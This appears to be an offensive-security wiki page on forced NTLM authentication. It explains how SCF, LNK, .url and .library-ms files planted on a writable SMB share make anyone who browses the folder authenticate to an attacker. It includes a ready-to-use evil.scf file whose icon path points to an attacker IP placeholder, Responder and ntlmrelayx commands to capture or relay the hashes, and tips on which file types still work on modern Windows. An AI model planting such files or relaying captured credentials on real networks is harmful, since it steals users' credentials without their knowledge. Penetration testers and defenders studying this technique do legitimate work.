---
title: "SCF and LNK coercion: coercing authentication from a share"
description: "Planting SCF, LNK, or URL and library files on a writable SMB share whose icon or resource loads from an attacker UNC path, so that merely browsing the folder in Explorer makes the viewer's machine authenticate to the attacker for NTLM capture or relay."
keywords:
  - SCF file
  - LNK icon
  - UNC coercion
  - forced authentication
  - NTLM capture
---

# SCF and LNK coercion

Windows Explorer resolves icons and resources when it renders a folder. A crafted file that points its icon at a UNC path on the attacker's host makes any user who browses the folder authenticate to that host, leaking their NTLM. SCF (Shell Command File) worked on older Windows; LNK shortcuts with a UNC icon location, and `.url` and `.library-ms` files, are the current equivalents.

```ini
# evil.scf planted on the writable share (legacy)
[Shell]
Command=2
IconFile=\\<attacker-ip>\share\x.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
# Capture or relay the coerced authentication
responder -I eth0
# or relay it straight to another host
ntlmrelayx.py -t smb://<target> -smb2support
```

## Exploitation notes

- The user never clicks anything: rendering the folder triggers the icon fetch and the authentication.
- SCF is blocked on modern Windows, so prefer `.lnk` with a UNC `IconLocation`, or `.url`/`.library-ms` files, which still coerce.
- The captured NTLM is cracked offline or relayed; see [Signing and relay](../signing-and-relay.md).

## References

- [The Hacker Recipes: forced authentication](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications)
- [HackTricks: places to steal NTLM creds](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/printers-spooler-service-abuse.html)
